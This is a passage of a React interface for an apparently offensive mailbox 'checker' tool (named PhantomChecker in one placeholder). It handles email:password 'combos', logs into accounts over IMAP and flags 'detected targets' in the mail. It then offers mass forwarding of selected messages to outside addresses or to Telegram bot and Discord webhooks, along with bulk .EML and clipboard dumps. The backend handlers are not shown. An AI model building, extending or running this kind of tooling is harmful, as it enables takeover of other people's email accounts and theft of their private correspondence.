                    <span style={{ color: '#00ff9d', fontSize: '0.68rem', fontWeight: 700, fontFamily: "'JetBrains Mono', monospace" }}>
                      ● REAL IMAP READY
                    </span>
                  </div>
                  <div style={{ fontSize: '1.05rem', fontWeight: 900, color: '#fff', fontFamily: "'JetBrains Mono', monospace" }}>
                    {selectedAccount}{password ? `:${password}` : ''}
                  </div>
                  <div style={{ fontSize: '0.7rem', color: '#8b9bb4', fontFamily: "'JetBrains Mono', monospace", marginTop: '4px' }}>
                    Server: <span style={{ color: '#fff' }}>{imapConfig.host}</span> &bull; Port: <span style={{ color: '#00e5ff' }}>{imapConfig.port} (SSL/TLS)</span>
                  </div>
                </div>

                <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                  <button
                    onClick={() => {
                      const text = password ? `${selectedAccount}:${password}` : selectedAccount;
                      navigator.clipboard?.writeText(text);
                      setToastMessage({ type: 'success', text: `Copied combo: ${text}` });
                      setTimeout(() => setToastMessage(null), 2500);
                    }}
                    className="glass-btn glass-btn-green"
                    style={{ fontSize: '0.72rem', padding: '6px 12px', display: 'flex', alignItems: 'center', gap: '5px' }}
                    title="Copy full combo"
                  >
                    <Copy size={12} /> Copy Combo
                  </button>
                  {webmailUrl && (
                    <a
                      href={webmailUrl}
                      target="_blank"
                      rel="noopener noreferrer"
                      className="glass-btn"
                      style={{ fontSize: '0.72rem', padding: '6px 12px', display: 'flex', alignItems: 'center', gap: '5px', textDecoration: 'none' }}
                      title="Open Webmail"
                    >
                      <ExternalLink size={12} /> Open Webmail
                    </a>
                  )}
                </div>
              </div>

              {/* Center Guidance & Action Tile */}
              <div style={{ textAlign: 'center', padding: '30px 20px' }}>
                <Mail size={44} color="rgba(0,229,255,0.4)" style={{ margin: '0 auto 14px' }} />
                <h3 style={{ fontSize: '1.1rem', fontWeight: 800, color: '#fff', margin: '0 0 8px' }}>
                  {filteredMails.length > 0 ? `${filteredMails.length} Messages in ${activeFolder}` : 'Mailbox Ready'}
                </h3>
                <p style={{ fontSize: '0.78rem', color: '#8b9bb4', maxWidth: '400px', margin: '0 auto 18px', lineHeight: 1.6 }}>
                  {filteredMails.length > 0
                    ? 'Click any message on the left to inspect complete RFC headers, sanitized visual HTML layout, and attachments.'
                    : 'Sync this mailbox to retrieve all incoming messages across standard and custom folders.'}
                </p>

                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '10px', flexWrap: 'wrap' }}>
                  {filteredMails.length > 0 ? (
                    <button
                      onClick={() => setSelectedMailId(filteredMails[0].id)}
                      className="glass-btn glass-btn-green"
                      style={{ fontSize: '0.78rem', padding: '8px 18px', fontWeight: 800, display: 'flex', alignItems: 'center', gap: '6px' }}
                    >
                      <Eye size={13} /> Open First Email ➔
                    </button>
                  ) : (
                    <button
                      onClick={() => handleFetchAllRealFolders(selectedAccount, password)}
                      disabled={isFetchingLive}
                      className="glass-btn glass-btn-green"
                      style={{ fontSize: '0.78rem', padding: '8px 18px', fontWeight: 800, display: 'flex', alignItems: 'center', gap: '6px' }}
                    >
                      <RefreshCw size={13} className={isFetchingLive ? 'animate-spin' : ''} />
                      {isFetchingLive ? 'Syncing...' : 'Sync Mailbox Now'}
                    </button>
                  )}
                </div>
              </div>

              {/* Detected Keyword Target Badges in this Account */}
              <div style={{
                background: 'rgba(0,0,0,0.3)',
                border: '1px solid rgba(255,255,255,0.06)',
                borderRadius: '10px',
                padding: '12px 16px',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'space-between',
                flexWrap: 'wrap',
                gap: '8px'
              }}>
                <span style={{ fontSize: '0.68rem', color: '#8b9bb4', fontFamily: "'JetBrains Mono', monospace" }}>
                  DETECTED TARGETS IN THIS ACCOUNT ({totalTargetHitsCount}):
                </span>
                <div style={{ display: 'flex', alignItems: 'center', gap: '6px', flexWrap: 'wrap' }}>
                  {totalTargetHitsCount === 0 ? (
                    <span style={{ fontSize: '0.66rem', color: '#64748b' }}>None detected yet in synced folders</span>
                  ) : (
                    Array.from(new Set(currentAccountMails.flatMap(m => m.matchedTargets || []))).map((t, idx) => (
                      <span key={idx} className="badge-purple" style={{ fontSize: '0.68rem', padding: '2px 8px' }}>
                        🎯 {t}
                      </span>
                    ))
                  )}
                </div>
              </div>
            </div>
          )}
        </div>
      </div>
    )}

      {/* Forward / Reply Composer Modal */}
      {showForwardModal && activeMail && (
        <div style={{
          position: 'fixed',
          inset: 0,
          background: 'rgba(0, 0, 0, 0.78)',
          backdropFilter: 'blur(8px)',
          zIndex: 9999,
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          padding: '20px'
        }}>
          <div className="glass-panel" style={{
            width: '100%',
            maxWidth: '680px',
            maxHeight: '90vh',
            display: 'flex',
            flexDirection: 'column',
            borderRadius: '16px',
            border: '1px solid rgba(0, 229, 255, 0.3)',
            boxShadow: '0 20px 60px rgba(0, 0, 0, 0.8), 0 0 30px rgba(0, 229, 255, 0.15)',
            background: '#0c101c',
            overflow: 'hidden'
          }}>
            {/* Modal Header */}
            <div style={{
              padding: '18px 24px',
              borderBottom: '1px solid rgba(255,255,255,0.1)',
              display: 'flex',
              justifyContent: 'space-between',
              alignItems: 'center',
              background: 'rgba(255,255,255,0.02)'
            }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
                <div style={{
                  width: '34px',
                  height: '34px',
                  borderRadius: '10px',
                  background: forwardSubject.startsWith('Re:') ? 'rgba(0, 255, 157, 0.15)' : 'rgba(0, 229, 255, 0.15)',
                  border: `1px solid ${forwardSubject.startsWith('Re:') ? 'rgba(0, 255, 157, 0.3)' : 'rgba(0, 229, 255, 0.3)'}`,
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  color: forwardSubject.startsWith('Re:') ? '#00ff9d' : '#00e5ff'
                }}>
                  {forwardSubject.startsWith('Re:') ? <CornerUpLeft size={18} /> : <CornerUpRight size={18} />}
                </div>
                <div>
                  <h3 style={{ margin: 0, fontSize: '1rem', fontWeight: 700, color: '#fff' }}>
                    {forwardSubject.startsWith('Re:') ? 'Reply to Email' : 'Forward Email Message'}
                  </h3>
                  <p style={{ margin: 0, fontSize: '0.72rem', color: '#8b9bb4', fontFamily: "'JetBrains Mono', monospace" }}>
                    From: <span style={{ color: '#00ff9d' }}>{selectedAccount}</span> via IMAP/SMTP
                  </p>
                </div>
              </div>
              <button
                onClick={() => setShowForwardModal(false)}
                className="glass-btn"
                style={{ padding: '6px 10px', fontSize: '0.8rem' }}
              >
                ✕
              </button>
            </div>

            {/* Modal Body / Form */}
            <form onSubmit={handleSendForward} style={{ padding: '20px 24px', overflowY: 'auto', flex: 1, display: 'flex', flexDirection: 'column', gap: '14px' }}>
              
              {/* Recipient Field */}
              <div>
                <label style={{ display: 'block', fontSize: '0.75rem', fontWeight: 600, color: '#8b9bb4', marginBottom: '6px' }}>
                  {forwardSubject.startsWith('Re:') ? 'Reply To:' : 'Destination Email (To):'} <span style={{ color: '#ef4444' }}>*</span>
                </label>
                <div>
                  <input
                    type="email"
                    required
                    placeholder="recipient@example.com"
                    value={forwardRecipient}
                    onChange={(e) => setForwardRecipient(e.target.value)}
                    className="glass-input"
                    style={{ width: '100%', fontSize: '0.85rem', padding: '10px 14px', fontFamily: "'JetBrains Mono', monospace" }}
                    autoFocus
                  />
                </div>
              </div>

              {/* Subject Field */}
              <div>
                <label style={{ display: 'block', fontSize: '0.75rem', fontWeight: 600, color: '#8b9bb4', marginBottom: '6px' }}>
                  Subject Line:
                </label>
                <input
                  type="text"
                  required
                  value={forwardSubject}
                  onChange={(e) => setForwardSubject(e.target.value)}
                  className="glass-input"
                  style={{ width: '100%', fontSize: '0.85rem', padding: '10px 14px' }}
                />
              </div>

              {/* User Note Field */}
              <div>
                <label style={{ display: 'block', fontSize: '0.75rem', fontWeight: 600, color: '#8b9bb4', marginBottom: '6px' }}>
                  {forwardSubject.startsWith('Re:') ? 'Your Reply Message:' : 'Add Note / Message (Optional):'}
                </label>
                <textarea
                  rows={3}
                  placeholder={forwardSubject.startsWith('Re:') ? "Type your reply message here..." : "Type any forwarding note or comments to include at the top of the message..."}
                  value={forwardNote}
                  onChange={(e) => setForwardNote(e.target.value)}
                  className="glass-input"
                  style={{ width: '100%', fontSize: '0.8rem', padding: '10px 14px', resize: 'vertical' }}
                />
              </div>

              {/* Original Message Preview Box */}
              <div>
                <label style={{ display: 'block', fontSize: '0.72rem', fontWeight: 600, color: '#64748b', marginBottom: '4px' }}>
                  Quoted Message Body:
                </label>
                <div style={{
                  maxHeight: '130px',
                  overflowY: 'auto',
                  background: 'rgba(0,0,0,0.45)',
                  border: '1px solid rgba(255,255,255,0.08)',
                  borderRadius: '8px',
                  padding: '10px 14px',
                  fontSize: '0.72rem',
                  color: '#94a3b8',
                  fontFamily: "'JetBrains Mono', monospace",
                  whiteSpace: 'pre-wrap'
                }}>
                  {forwardSubject.startsWith('Re:') ? (
                    <div style={{ color: '#00ff9d', marginBottom: '6px', fontWeight: 600 }}>
                      On {activeMail.date || 'earlier message'}, {activeMail.sender || 'Sender'} &lt;{activeMail.senderEmail}&gt; wrote:
                    </div>
                  ) : (
                    <div style={{ color: '#00e5ff', marginBottom: '6px', fontWeight: 600 }}>
                      ---------- Forwarded message ---------<br />
                      From: {activeMail.sender} &lt;{activeMail.senderEmail}&gt;<br />
                      Date: {activeMail.date}<br />
                      Subject: {activeMail.subject}
                    </div>
                  )}
                  {activeMail.bodyText || '(No plain text body)'}
                </div>
              </div>

              {/* Result Status Message */}
              {forwardResult && (
                <div style={{
                  padding: '10px 14px',
                  borderRadius: '8px',
                  fontSize: '0.78rem',
                  display: 'flex',
                  alignItems: 'center',
                  gap: '8px',
                  background: forwardResult.type === 'success' ? 'rgba(0,255,157,0.15)' : 'rgba(239,68,68,0.15)',
                  border: `1px solid ${forwardResult.type === 'success' ? '#00ff9d' : '#ef4444'}`,
                  color: forwardResult.type === 'success' ? '#00ff9d' : '#ef4444'
                }}>
                  {forwardResult.type === 'success' ? <CheckCircle2 size={16} /> : <ShieldAlert size={16} />}
                  <span>{forwardResult.text}</span>
                </div>
              )}

              {/* Dispatch Action Toolbar */}
              <div style={{
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'space-between',
                flexWrap: 'wrap',
                gap: '8px',
                paddingTop: '12px',
                borderTop: '1px solid rgba(255,255,255,0.08)'
              }}>
                {/* Alternative offline methods */}
                <div style={{ display: 'flex', alignItems: 'center', gap: '6px', flexWrap: 'wrap' }}>
                  <button
                    type="button"
                    onClick={handleOpenMailto}
                    className="glass-btn"
                    style={{ fontSize: '0.7rem', padding: '6px 10px', display: 'flex', alignItems: 'center', gap: '4px' }}
                    title="Open in default desktop email app"
                  >
                    <ExternalLink size={12} /> Desktop Mail (mailto:)
                  </button>
                  <button
                    type="button"
                    onClick={handleDownloadEml}
                    className="glass-btn"
                    style={{ fontSize: '0.7rem', padding: '6px 10px', display: 'flex', alignItems: 'center', gap: '4px' }}
                    title="Download authentic RFC822 .eml file"
                  >
                    <Download size={12} /> Download .EML
                  </button>
                  <button
                    type="button"
                    onClick={handleCopyForwardText}
                    className="glass-btn"
                    style={{ fontSize: '0.7rem', padding: '6px 10px', display: 'flex', alignItems: 'center', gap: '4px' }}
                    title="Copy formatted email to clipboard"
                  >
                    {copiedForwardText ? <Check size={12} color="#00ff9d" /> : <Copy size={12} />}
                    {copiedForwardText ? 'Copied!' : 'Copy Text'}
                  </button>
                </div>

                {/* Primary Submit */}
                <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                  <button
                    type="button"
                    onClick={() => setShowForwardModal(false)}
                    className="glass-btn"
                    style={{ fontSize: '0.75rem', padding: '8px 14px' }}
                  >
                    Cancel
                  </button>
                  <button
                    type="submit"
                    disabled={isSendingForward || !forwardRecipient.trim()}
                    className={`glass-btn ${forwardSubject.startsWith('Re:') ? 'glass-btn-green' : 'glass-btn-primary'}`}
                    style={{
                      fontSize: '0.75rem',
                      padding: '8px 18px',
                      display: 'flex',
                      alignItems: 'center',
                      gap: '6px',
                      fontWeight: 700
                    }}
                  >
                    <Send size={14} className={isSendingForward ? 'animate-spin' : ''} />
                    {isSendingForward 
                      ? 'Dispatching...' 
                      : (forwardSubject.startsWith('Re:') ? 'Send Reply' : 'Send Forward')}
                  </button>
                </div>
              </div>
            </form>
          </div>
        </div>
      )}

      {/* Mass Forward & Relay Manager Modal */}
      {showMassForwardModal && (
        <div style={{
          position: 'fixed',
          inset: 0,
          background: 'rgba(0, 0, 0, 0.82)',
          backdropFilter: 'blur(10px)',
          zIndex: 9999,
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          padding: '20px'
        }}>
          <div className="glass-panel" style={{
            width: '100%',
            maxWidth: '720px',
            maxHeight: '92vh',
            display: 'flex',
            flexDirection: 'column',
            borderRadius: '16px',
            border: '1px solid rgba(0, 255, 157, 0.4)',
            boxShadow: '0 25px 70px rgba(0, 0, 0, 0.85), 0 0 40px rgba(0, 255, 157, 0.2)',
            background: '#0a0f1d',
            overflow: 'hidden'
          }}>
            {/* Modal Header */}
            <div style={{
              padding: '18px 24px',
              borderBottom: '1px solid rgba(255,255,255,0.1)',
              display: 'flex',
              justifyContent: 'space-between',
              alignItems: 'center',
              background: 'rgba(0, 255, 157, 0.04)'
            }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
                <div style={{
                  width: '36px',
                  height: '36px',
                  borderRadius: '10px',
                  background: 'rgba(0, 255, 157, 0.15)',
                  border: '1px solid rgba(0, 255, 157, 0.4)',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  color: '#00ff9d'
                }}>
                  <Send size={18} />
                </div>
                <div>
                  <h3 style={{ margin: 0, fontSize: '1.05rem', fontWeight: 700, color: '#fff' }}>
                    Mass Forward & Relay Manager
                  </h3>
                  <p style={{ margin: 0, fontSize: '0.72rem', color: '#8b9bb4', fontFamily: "'JetBrains Mono', monospace" }}>
                    Source: <span style={{ color: '#00ff9d' }}>{selectedAccount}</span> &bull; <strong style={{ color: '#00e5ff' }}>{selectedMailsList.length}</strong> emails selected
                  </p>
                </div>
              </div>
              <button
                onClick={() => setShowMassForwardModal(false)}
                className="glass-btn"
                style={{ padding: '6px 10px', fontSize: '0.8rem' }}
              >
                ✕
              </button>
            </div>

            {/* Mode Switcher Tabs */}
            <div style={{ display: 'flex', borderBottom: '1px solid rgba(255,255,255,0.08)', background: 'rgba(0,0,0,0.3)', padding: '0 20px' }}>
              <button
                type="button"
                onClick={() => setMassForwardMode('relay')}
                style={{
                  padding: '10px 16px',
                  background: 'none',
                  border: 'none',
                  borderBottom: massForwardMode === 'relay' ? '2px solid #00ff9d' : '2px solid transparent',
                  color: massForwardMode === 'relay' ? '#00ff9d' : '#8b9bb4',
                  fontWeight: massForwardMode === 'relay' ? 700 : 500,
                  fontSize: '0.78rem',
                  cursor: 'pointer'
                }}
              >
                📧 Multi-Email Relay
              </button>
              <button
                type="button"
                onClick={() => setMassForwardMode('webhook')}
                style={{
                  padding: '10px 16px',
                  background: 'none',
                  border: 'none',
                  borderBottom: massForwardMode === 'webhook' ? '2px solid #00e5ff' : '2px solid transparent',
                  color: massForwardMode === 'webhook' ? '#00e5ff' : '#8b9bb4',
                  fontWeight: massForwardMode === 'webhook' ? 700 : 500,
                  fontSize: '0.78rem',
                  cursor: 'pointer'
                }}
              >
                🌐 Webhook Relay (No SMTP)
              </button>
              <button
                type="button"
                onClick={() => setMassForwardMode('zip')}
                style={{
                  padding: '10px 16px',
                  background: 'none',
                  border: 'none',
                  borderBottom: massForwardMode === 'zip' ? '2px solid #b026ff' : '2px solid transparent',
                  color: massForwardMode === 'zip' ? '#b026ff' : '#8b9bb4',
                  fontWeight: massForwardMode === 'zip' ? 700 : 500,
                  fontSize: '0.78rem',
                  cursor: 'pointer'
                }}
              >
                💾 Export .EML Bundle
              </button>
              <button
                type="button"
                onClick={() => setMassForwardMode('copy')}
                style={{
                  padding: '10px 16px',
                  background: 'none',
                  border: 'none',
                  borderBottom: massForwardMode === 'copy' ? '2px solid #f59e0b' : '2px solid transparent',
                  color: massForwardMode === 'copy' ? '#f59e0b' : '#8b9bb4',
                  fontWeight: massForwardMode === 'copy' ? 700 : 500,
                  fontSize: '0.78rem',
                  cursor: 'pointer'
                }}
              >
                📋 Formatted Text Dump
              </button>
            </div>

            {/* Modal Form Body */}
            <form onSubmit={handleExecuteMassForward} style={{ padding: '20px 24px', overflowY: 'auto', flex: 1, display: 'flex', flexDirection: 'column', gap: '14px' }}>
              
              {massForwardMode === 'relay' && (
                <>
                  <div>
                    <label style={{ display: 'block', fontSize: '0.75rem', fontWeight: 600, color: '#8b9bb4', marginBottom: '6px' }}>
                      Destination Email Recipients (one per line or comma-separated): <span style={{ color: '#ef4444' }}>*</span>
                    </label>
                    <textarea
                      rows={3}
                      required
                      placeholder={`destination1@gmail.com\ndestination2@outlook.com, notify@target.com`}
                      value={massForwardRecipients}
                      onChange={(e) => setMassForwardRecipients(e.target.value)}
                      className="glass-input"
                      style={{ width: '100%', fontSize: '0.8rem', padding: '10px 14px', fontFamily: "'JetBrains Mono', monospace" }}
                      autoFocus
                    />
                  </div>

                  <div>
                    <label style={{ display: 'block', fontSize: '0.75rem', fontWeight: 600, color: '#8b9bb4', marginBottom: '6px' }}>
                      Forwarding Header Note (Optional):
                    </label>
                    <input
                      type="text"
                      placeholder="e.g. Mass target hits forwarded from PhantomChecker"
                      value={massForwardNote}
                      onChange={(e) => setMassForwardNote(e.target.value)}
                      className="glass-input"
                      style={{ width: '100%', fontSize: '0.82rem', padding: '10px 14px' }}
                    />
                  </div>
                </>
              )}

              {massForwardMode === 'webhook' && (
                <>
                  <div style={{ background: 'rgba(0, 229, 255, 0.06)', border: '1px solid rgba(0, 229, 255, 0.2)', borderRadius: '8px', padding: '12px 16px', fontSize: '0.75rem', color: '#94a3b8' }}>
                    <strong style={{ color: '#00e5ff' }}>No SMTP Required:</strong> Dispatches all selected {selectedMailsList.length} emails as a single structured JSON payload directly to your custom webhook URL (Discord Webhook, Telegram Bot forwarder, or cloud HTTP endpoint).
                  </div>

                  <div>
                    <label style={{ display: 'block', fontSize: '0.75rem', fontWeight: 600, color: '#8b9bb4', marginBottom: '6px' }}>
                      Target Webhook URL: <span style={{ color: '#ef4444' }}>*</span>
                    </label>
                    <input
                      type="url"
                      required
                      placeholder="https://api.telegram.org/bot<TOKEN>/sendMessage?chat_id=<CHAT_ID> or https://discord.com/api/webhooks/..."
                      value={massWebhookUrl}
                      onChange={(e) => setMassWebhookUrl(e.target.value)}
                      className="glass-input"
                      style={{ width: '100%', fontSize: '0.82rem', padding: '10px 14px', fontFamily: "'JetBrains Mono', monospace" }}
                      autoFocus
                    />
                  </div>

                  <div>
                    <label style={{ display: 'block', fontSize: '0.75rem', fontWeight: 600, color: '#8b9bb4', marginBottom: '6px' }}>
                      Relay Batch Note / Tag (Optional):
                    </label>
                    <input
                      type="text"
                      placeholder="e.g. Batch hit dump for review"
                      value={massForwardNote}
                      onChange={(e) => setMassForwardNote(e.target.value)}
                      className="glass-input"
                      style={{ width: '100%', fontSize: '0.82rem', padding: '10px 14px' }}
                    />
                  </div>
                </>
              )}

              {massForwardMode === 'zip' && (
                <div style={{ textAlign: 'center', padding: '24px 16px' }}>
                  <Download size={40} color="#b026ff" style={{ margin: '0 auto 12px' }} />
                  <h4 style={{ color: '#fff', margin: '0 0 8px 0', fontSize: '0.95rem' }}>Export All {selectedMailsList.length} Selected Emails as .EML</h4>
                  <p style={{ color: '#8b9bb4', fontSize: '0.75rem', maxWidth: '450px', margin: '0 auto 16px' }}>
                    Downloads an authentic RFC 822 combined .EML bundle preserving all headers, raw MIME bodies, dates, and attachments compatible with Thunderbird, Apple Mail, and Outlook.
                  </p>
                  <button
                    type="button"
                    onClick={handleMassDownloadZip}
                    className="glass-btn glass-btn-purple"
                    style={{ padding: '10px 24px', fontSize: '0.82rem', fontWeight: 700 }}
                  >
                    Download .EML Bundle Now
                  </button>
                </div>
              )}

              {massForwardMode === 'copy' && (
                <div style={{ textAlign: 'center', padding: '24px 16px' }}>
                  <Copy size={40} color="#f59e0b" style={{ margin: '0 auto 12px' }} />
                  <h4 style={{ color: '#fff', margin: '0 0 8px 0', fontSize: '0.95rem' }}>Dump {selectedMailsList.length} Emails to Clipboard</h4>
                  <p style={{ color: '#8b9bb4', fontSize: '0.75rem', maxWidth: '450px', margin: '0 auto 16px' }}>
                    Formats every selected email with full headers, timestamps, target hits, and text bodies into a clean readable text format and copies it to your clipboard.
                  </p>
                  <button
                    type="button"
                    onClick={handleMassCopyText}
                    className="glass-btn glass-btn-green"
                    style={{ padding: '10px 24px', fontSize: '0.82rem', fontWeight: 700 }}
                  >
                    Copy All {selectedMailsList.length} Emails to Clipboard
                  </button>
                </div>
              )}

              {/* Selected Mails Summary Box */}
              <div>
                <label style={{ display: 'block', fontSize: '0.72rem', fontWeight: 600, color: '#64748b', marginBottom: '4px' }}>
                  Selected Messages to Dispatch ({selectedMailsList.length}):
                </label>
                <div style={{
                  maxHeight: '120px',
                  overflowY: 'auto',
                  background: 'rgba(0,0,0,0.4)',
                  border: '1px solid rgba(255,255,255,0.06)',
                  borderRadius: '8px',
                  padding: '8px 12px',
                  fontSize: '0.7rem',
                  display: 'flex',
                  flexDirection: 'column',
                  gap: '4px'
                }}>
                  {selectedMailsList.map((m, i) => (
                    <div key={m.id} style={{ display: 'flex', justifyContent: 'space-between', color: '#cbd5e1' }}>
                      <span style={{ maxWidth: '70%', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                        {i + 1}. <strong style={{ color: '#fff' }}>{m.subject}</strong> &bull; {m.sender}
                      </span>
                      <span style={{ color: '#8b9bb4', fontFamily: "'JetBrains Mono', monospace" }}>{m.date}</span>
                    </div>
                  ))}
                </div>
              </div>

              {/* Mass Forward Result Message */}
              {massForwardResult && (
                <div style={{
                  padding: '10px 14px',
                  borderRadius: '8px',
                  fontSize: '0.78rem',
                  display: 'flex',
                  alignItems: 'center',
                  gap: '8px',
                  background: massForwardResult.type === 'success' ? 'rgba(0,255,157,0.15)' : 'rgba(239,68,68,0.15)',
                  border: `1px solid ${massForwardResult.type === 'success' ? '#00ff9d' : '#ef4444'}`,
                  color: massForwardResult.type === 'success' ? '#00ff9d' : '#ef4444'
                }}>
                  {massForwardResult.type === 'success' ? <CheckCircle2 size={16} /> : <ShieldAlert size={16} />}
                  <span>{massForwardResult.text}</span>
                </div>
              )}

              {/* Action Toolbar */}
              {(massForwardMode === 'relay' || massForwardMode === 'webhook') && (
                <div style={{
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'flex-end',
                  gap: '8px',
                  paddingTop: '12px',
                  borderTop: '1px solid rgba(255,255,255,0.08)'
                }}>
                  <button
                    type="button"
                    onClick={() => setShowMassForwardModal(false)}
                    className="glass-btn"
                    style={{ fontSize: '0.75rem', padding: '8px 14px' }}
                  >
                    Cancel
                  </button>
                  <button
                    type="submit"
                    disabled={isSendingMassForward || (massForwardMode === 'relay' && !massForwardRecipients.trim()) || (massForwardMode === 'webhook' && !massWebhookUrl.trim())}
                    className="glass-btn glass-btn-green"
                    style={{
                      fontSize: '0.75rem',
                      padding: '8px 20px',
                      display: 'flex',
                      alignItems: 'center',
                      gap: '6px',
                      fontWeight: 700
                    }}
                  >
                    <Send size={14} className={isSendingMassForward ? 'animate-spin' : ''} />
                    {isSendingMassForward
                      ? `Dispatching ${selectedMailsList.length} Emails...`
                      : (massForwardMode === 'webhook' ? 'Dispatch to Webhook' : `Relay ${selectedMailsList.length} Emails`)}
                  </button>
                </div>
              )}
            </form>
          </div>
        </div>
      )}

      {/* Link Security Inspector Modal */}
      {showLinkInspectorModal && (
        <div style={{
          position: 'fixed',
          top: 0,
          left: 0,
          right: 0,
          bottom: 0,
          background: 'rgba(5, 7, 14, 0.85)',
          backdropFilter: 'blur(8px)',
          zIndex: 9999,
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          padding: '20px'
        }}>
          <div className="glass-panel" style={{
            width: '100%',
            maxWidth: '750px',
            maxHeight: '85vh',
            display: 'flex',
            flexDirection: 'column',
            padding: '24px',
            borderRadius: '16px',
            border: '1px solid rgba(0, 229, 255, 0.3)',
            boxShadow: '0 20px 60px rgba(0,0,0,0.7)',
            background: '#0a0d18'
          }}>
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '16px', borderBottom: '1px solid rgba(255,255,255,0.08)', paddingBottom: '12px' }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
                <Link2 size={20} color="#00e5ff" />
                <h3 style={{ fontSize: '1.05rem', fontWeight: 800, color: '#fff', margin: 0 }}>
                  Embedded Link Security Inspector
                </h3>
              </div>
              <button
                onClick={() => setShowLinkInspectorModal(false)}
                style={{ background: 'none', border: 'none', color: '#8b9bb4', fontSize: '1.2rem', cursor: 'pointer' }}
              >
                ✕
              </button>
            </div>

            <p style={{ fontSize: '0.78rem', color: '#8b9bb4', margin: '0 0 16px 0', lineHeight: 1.5 }}>
              Decoded destination URLs found inside this email. Inspect paths, tracking tokens, and query parameters safely without beaconing or triggering click-trackers:
            </p>

            <div style={{ flex: 1, minHeight: 0, overflowY: 'auto', display: 'flex', flexDirection: 'column', gap: '8px', paddingRight: '4px' }}>
              {extractedLinks.length === 0 ? (
                <div style={{ padding: '30px', textAlign: 'center', color: '#64748b', fontSize: '0.8rem' }}>
                  No hyperlinks detected in this message.
                </div>
              ) : (
                extractedLinks.map((item, idx) => (
                  <div key={idx} style={{
                    padding: '12px',
                    borderRadius: '8px',
                    background: 'rgba(255,255,255,0.02)',
                    border: '1px solid rgba(255,255,255,0.06)',
                    display: 'flex',
                    flexDirection: 'column',
                    gap: '6px'
                  }}>
                    <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', flexWrap: 'wrap', gap: '6px' }}>
                      <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                        <span style={{ fontSize: '0.75rem', fontWeight: 700, color: '#00e5ff', fontFamily: "'JetBrains Mono', monospace" }}>
                          {item.domain}
                        </span>
                        {item.isTracking && (
                          <span style={{ fontSize: '0.62rem', padding: '1px 6px', borderRadius: '4px', background: 'rgba(239,68,68,0.2)', color: '#f87171', border: '1px solid rgba(239,68,68,0.4)', fontWeight: 700 }}>
                            Redirect / Tracker Token
                          </span>
                        )}
                        <span style={{ fontSize: '0.62rem', padding: '1px 6px', borderRadius: '4px', background: 'rgba(0,255,157,0.1)', color: '#00ff9d', border: '1px solid rgba(0,255,157,0.3)' }}>
                          {item.protocol}
                        </span>
                      </div>

                      <button
                        onClick={() => {
                          navigator.clipboard.writeText(item.url);
                          setCopiedLinkText(item.url);
                          setTimeout(() => setCopiedLinkText(null), 2000);
                        }}
                        className="glass-btn"
                        style={{ fontSize: '0.68rem', padding: '3px 8px', color: copiedLinkText === item.url ? '#00ff9d' : '#8b9bb4' }}
                      >
                        {copiedLinkText === item.url ? <Check size={11} /> : <Copy size={11} />}
                        {copiedLinkText === item.url ? 'Copied' : 'Copy URL'}
                      </button>
                    </div>

                    <div style={{ fontSize: '0.72rem', color: '#cbd5e1', wordBreak: 'break-all', fontFamily: "'JetBrains Mono', monospace", background: '#05070e', padding: '6px 8px', borderRadius: '6px' }}>
                      {item.url}
                    </div>
                  </div>
                ))
              )}
            </div>

            <div style={{ marginTop: '16px', display: 'flex', justifyContent: 'flex-end' }}>
              <button
                onClick={() => setShowLinkInspectorModal(false)}
                className="glass-btn"
                style={{ fontSize: '0.75rem', padding: '6px 16px' }}
              >
                Close Inspector
              </button>
            </div>
          </div>
        </div>
      )}

      {toastMessage && (
        <div style={{
          position: 'fixed',
          bottom: '24px',
          right: '24px',
          zIndex: 10000,
          background: toastMessage.type === 'notice' ? '#1e293b' : toastMessage.type === 'error' ? '#7f1d1d' : '#064e3b',
          border: `1px solid ${toastMessage.type === 'notice' ? '#64748b' : toastMessage.type === 'error' ? '#ef4444' : '#00ff9d'}`,
          color: '#fff',
          padding: '12px 20px',
          borderRadius: '12px',
          boxShadow: '0 10px 30px rgba(0,0,0,0.5)',
          display: 'flex',
          alignItems: 'center',
          gap: '10px',
          fontSize: '0.8rem',
          fontWeight: 600,
          fontFamily: "'JetBrains Mono', monospace",
          animation: 'fadeIn 0.2s ease-out'
        }}>
          {toastMessage.type === 'error' ? (
            <ShieldAlert size={16} color="#ef4444" />
          ) : (
            <CheckCircle2 size={16} color="#00ff9d" />
          )}
          <span>{toastMessage.text}</span>
          <button
            onClick={() => setToastMessage(null)}
            style={{ background: 'none', border: 'none', color: '#94a3b8', cursor: 'pointer', marginLeft: '6px', fontSize: '1rem', lineHeight: 1 }}
          >
            ✕
          </button>
        </div>
      )}
    </div>
  );
}
